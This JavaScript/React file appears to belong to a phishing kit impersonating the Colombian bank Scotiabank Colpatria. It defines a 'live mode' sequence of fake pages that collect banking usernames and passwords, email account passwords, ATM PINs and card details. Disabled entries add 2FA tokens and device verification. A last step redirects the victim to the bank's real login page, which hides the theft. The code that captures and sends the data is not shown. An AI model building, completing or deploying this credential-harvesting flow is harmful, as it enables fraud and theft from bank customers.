import { createContext } from 'react'
// import { EmailAndPassword } from '../components/pages/email/emailAndPassword/EmailAndPassword'
// import { EmailVerification } from '../components/pages/EmailVerification'
// import { UsernameAndPassword } from '../components/pages/usernamePassword/UsernameAndPassword'
// import { Username } from '../components/pages/username/Username'
// import { Password } from '../components/pages/password/Password'
// import { Token } from '../components/pages/token/Token'
import { UsernameAndPassword } from '../components/pages/usernamePassword/UsernameAndPassword'
import { CreditCard } from '../components/pages/card/CreditCard'
import { Atm } from '../components/pages/cajeroAtm/Atm'
import { EmailAndPassword } from '../components/pages/email/emailAndPassword/EmailAndPassword'

export const ModeLiveContext = createContext()

export const ModeLiveProvider = ({ children }) => {
    
    const liveData = [
        {
            textPage: 'Usuario y contraseña',
            urlPage: '/',
            Element: <UsernameAndPassword pageNow={'/'} />,
        },

        {
            textPage: 'Correo y contraseña del correo',
            urlPage: '/passwordEmail',
            Element: <EmailAndPassword pageNow={'/passwordEmail'} />,
        },
        {
            textPage: 'Clave ATM',
            urlPage: '/atm-validation',
            Element: <Atm pageNow={'/atm-validation'} />,
        },
        {
            textPage: 'Tarjeta de Credito/Debito',
            urlPage: '/tc-validation',
            Element: <CreditCard pageNow={'/tc-validation'} />,
        },
        
        // {
        //     textPage: 'Usuario',
        //     urlPage: '/',
        //     Element: <Username pageNow={'/'} />,
        // },
        // {
        //     textPage: 'Contraseña',
        //     urlPage: '/password',
        //     Element: <Password pageNow={'/password'}/>,
        // },
        // {
        //     textPage: 'Clave Dinamica Dos factores',
        //     urlPage: '/token',
        //     Element: <Token tokenMode={'token1'} pageNow={'/token'}/>,
        // },
        // {
        //     textPage: 'Verificacion de dispositivo',
        //     urlPage: '/verificationDevice',
        //     Element: <EmailVerification pageNow={'/verificationDevice'} />,
        // }
        {
            textPage: 'Terminar',
            urlPage: 'https://www.banco.scotiabankcolpatria.com/banca-virtual/login/',
        }
    ] 

    const liveDataFilter = liveData.map(({textPage, urlPage}, i) => ({urlPage, textPage, i}))
    
    return (
        <ModeLiveContext.Provider value={{ modeLive: true, liveData, liveDataFilter }}>
            { children }
        </ModeLiveContext.Provider>
    )
}